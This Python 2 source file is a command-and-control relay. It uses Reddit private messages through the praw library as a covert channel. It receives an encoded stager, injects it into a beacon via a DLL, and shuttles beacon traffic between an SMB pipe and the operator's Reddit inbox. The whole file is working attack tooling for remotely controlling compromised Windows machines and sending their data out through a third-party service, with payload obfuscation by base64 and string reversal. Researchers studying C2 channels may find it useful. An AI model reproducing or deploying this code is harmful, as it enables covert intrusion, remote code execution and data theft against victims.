from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

# Encoder imports:
import base64
import urllib

# Transport imports:
import praw
from time import sleep

# START GHETTO CONFIG, should be read in when compiled...
CLIENT_ID = ""
CLIENT_SECRET = ""
PASSWORD = ""
USER_AGENT = "I AM TOTALLY MALWARE by /u/"
USERNAME = ""
SEND_NAME = "Resp4You" # Subject of PM
RECV_NAME = "New4You"
# END GHETTO CONFIG

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
	data = base64.b64encode(data)
	return urllib.quote_plus(data)[::-1]

def decode(data):
	data = urllib.unquote(data[::-1])
	return base64.b64decode(data)
# </encoder functions>

# <transport functions>


def prepTransport():
	# Auth as a script app
	global reddit # DEBUG: Not sure if needed
	global TASK_ID
	TASK_ID = "0"
	reddit = praw.Reddit(client_id=CLIENT_ID,
		client_secret=CLIENT_SECRET,
		password=PASSWORD,
		user_agent=USER_AGENT,
		username=USERNAME)
	# Debug, verify that we are connected
	print "We have successfully authenticated: %s" %(reddit)
	return reddit

def sendData(data):
	data = encode(data)

	if len(data) > 10000:
		data_list = [data[i:i+10000] for i in range(0, len(data), 10000)]
		sent_counter = 1
		for message in data_list:
			cur_subject = SEND_NAME + (" | " + str(sent_counter) + "/" + str(len(data_list)))
			reddit.redditor(USERNAME).message(cur_subject, message)
			sent_counter += 1
		return 0
	else:
		reddit.redditor(USERNAME).message(SEND_NAME, data)
		return 0

def recvData():
	counter_pattern = re.compile("^.* \| [0-9]+/[0-9]+$")
	total_count = re.compile("^.*/[0-9]+$")
	current_target = 1
	task = ""
	# First, we'll see if there's a new message, if it has a counter, 
	#  we'll take it into account, and loop through the messages to find
	#  our first one.
	while True:
		for message in reddit.inbox.messages(limit=1):
			if message.id <= TASK_ID:
				sleep(5)
				pass
			
			if counter_pattern.match(message.subject) and (RECV_NAME in message.subject):
				# This is incredibly dirty, I apologize in advance. Basically,
				#   we get the count, find the first message, 
				#   set it to the TASK_ID, and start to compile the full task
				counter_target = message.subject.split("/")[1]
				
				if message.subject == (RECV_NAME + " | 1/" + str(counter_target)):
					global TASK_ID
					TASK_ID = message.id
					task += message.body
					current_target += 1
					sleep(1)
					pass
				
				elif int(current_target) > int(counter_target):
					global TASK_ID
					TASK_ID = message.id
					return decode(task)
				
				elif message.subject != (RECV_NAME + " | " + str(current_target) + "/" + str(counter_target)):
					# We're getting these out of order, time for us to find the next message, and loop through it
					while True:
						msgiter = iter(reddit.inbox.messages())
						for submessage in msgiter:
							if int(current_target) > int(counter_target):
								global TASK_ID
								TASK_ID = message.id
								return decode(task)
							if submessage.subject == (RECV_NAME + " | " + str(current_target) + "/" + str(counter_target)):
								current_target += 1
								task += submessage.body
								# sleep(0.1)
								break
							if submessage.subject != (RECV_NAME + " | " + str(current_target) + "/" + str(counter_target)):
								# sleep(0.1)
								continue
							else:
								pass
				
			# Got our new task
			elif message.subject == RECV_NAME:
				task = message.body
				global TASK_ID
				TASK_ID = message.id
				return decode(task)
			
			else:
				# message.id isn't right, but we don't have a task yet
				sleep(5)
				pass


# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	sys.stdout.write('wp: %s\n'%len(chunk))
	sys.stdout.flush()
	print chunk
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go():
	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
	print "Waiting for stager..." # DEBUG
	p = recvData()
	print "Got a stager! loading..."
	sleep(2)
	# print "Decoded stager = " + str(p) # DEBUG
	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
	handle_beacon = start_beacon(p)

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon

def interact(handle_beacon):
	while(True):
		sleep(1.5)
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		sendData(chunk)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"
		
		newTask = recvData()

		print "Got new task: %s" % (newTask)
		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	sys.exit(0)
